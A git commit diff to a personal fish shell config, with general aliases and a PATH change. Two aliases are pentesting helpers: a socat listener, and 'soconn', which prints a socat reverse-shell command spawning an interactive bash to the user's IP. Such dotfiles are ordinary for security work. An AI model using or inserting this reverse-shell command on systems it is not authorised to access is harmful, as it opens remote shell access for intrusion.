1876e15b30a400e8729158109763b9b6a200f8ea
cinerieus <cinereus@protonmail.com>
2023-02-01 12:37:25 +0000

    Update config.fish

--- config.fish
+++ config.fish
@@ -4,11 +4,11 @@ alias ll='ls --color=auto -lah'
 alias copy='rsync -ah --info=progress2'
 alias cls='clear'
 alias solisten='socat file:`tty`,raw,echo=0 tcp-listen:$LPORT'
-alias soconn='echo "socat exec:\"bash -li\",pty,stderr,setsid,sigint,sane tcp:[$(hostname -i)]:$LPORT"'
+alias soconn='echo "socat exec:\"bash -li\",pty,stderr,setsid,sigint,sane tcp:[(hostname -i)]:$LPORT"'
 alias nv='nvim'
 alias gostatic="go build --ldflags '-s -w -linkmode external -extldflags "-static"'"
 
-fish_add_path ~/.local/bin
+set PATH ~/.local/bin $PATH
 #set -x CC /usr/bin/musl-gcc
 
 umask 002
